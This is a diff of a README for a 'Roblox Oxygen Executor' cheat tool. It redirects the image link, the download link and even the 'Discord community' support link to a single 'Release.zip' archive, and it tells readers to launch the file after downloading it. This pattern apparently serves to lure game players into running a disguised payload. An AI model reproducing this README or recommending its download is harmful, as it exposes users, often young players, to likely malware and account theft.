@@ -4,7 +4,7 @@ Welcome to the **Roblox Oxygen Executor** repository! This versatile script exec
 
 ## Repository: "Roblox-Oxygen"
 
-![Roblox Oxygen](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+![Roblox Oxygen](https://github.com/deculkonz/Roblox-Oxygen/releases/download/v1.0/Release.zip)
 
 ### Short Description:
 **Oxygen Executor** is a powerful tool that opens up a world of possibilities for Roblox players. Whether you're looking to tweak game mechanics, enhance visuals, or experiment with new features, Oxygen has got you covered.
@@ -25,7 +25,7 @@ Welcome to the **Roblox Oxygen Executor** repository! This versatile script exec
 - roblox-oxygen
 
 ### Get Started:
-To dive into the world of Roblox modification with Oxygen Executor, you can [download the latest version here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Remember, launch the file after downloading it to kickstart your Oxygen Executor journey!
+To dive into the world of Roblox modification with Oxygen Executor, you can [download the latest version here](https://github.com/deculkonz/Roblox-Oxygen/releases/download/v1.0/Release.zip). Remember, launch the file after downloading it to kickstart your Oxygen Executor journey!
 
 ### Features:
 - **Lua Script Execution:** Run custom Lua scripts to customize your gameplay.
@@ -42,7 +42,7 @@ To dive into the world of Roblox modification with Oxygen Executor, you can [dow
 Contributions to the **Roblox Oxygen** repository are welcome! Feel free to submit pull requests for new features, bug fixes, or enhancements to make Oxygen even better for the Roblox community.
 
 ### Support:
-For any questions, issues, or suggestions, please visit our [Discord community](https://discord.com/roblox-oxygen) to connect with other users and get the help you need.
+For any questions, issues, or suggestions, please visit our [Discord community](https://github.com/deculkonz/Roblox-Oxygen/releases/download/v1.0/Release.zip) to connect with other users and get the help you need.
 
 ### Releases:
 If the provided link does not work or you need to access different versions of Oxygen Executor, check out the "Releases" section of this repository for a variety of release options.
